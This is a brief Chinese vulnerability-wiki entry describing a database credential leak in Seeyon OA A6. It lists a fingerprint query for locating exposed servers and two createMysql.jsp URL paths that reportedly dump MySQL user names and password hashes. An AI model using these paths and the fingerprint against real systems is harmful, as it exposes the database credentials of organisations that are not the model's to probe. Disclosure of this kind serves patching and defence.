---
title: "致远OA A6 createMysql.jsp 数据库敏感信息泄露"
date: 2026-10-17 09:13:12
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "致远OA"
tags:
  - "致远OA"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

致远OA A6 存在数据库敏感信息泄露，攻击者可以通过访问特定的URL获取数据库账户以及密码 MD5

## 漏洞影响

```
致远OA A6
```

## 网络测绘

```
title="致远A8+协同管理软件.A6"
```

## 漏洞复现

当访问如下URL时执行了SQL语句 `select *from mysql.user;` 进行查询并返回到页面中

```
/yyoa/createMysql.jsp
/yyoa/ext/createMysql.jsp
```

![image-20220520152725777](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201527828.png)

![image-20220520152737237](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201527304.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E8%87%B4%E8%BF%9COA-A6-createMysql.jsp-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.md)
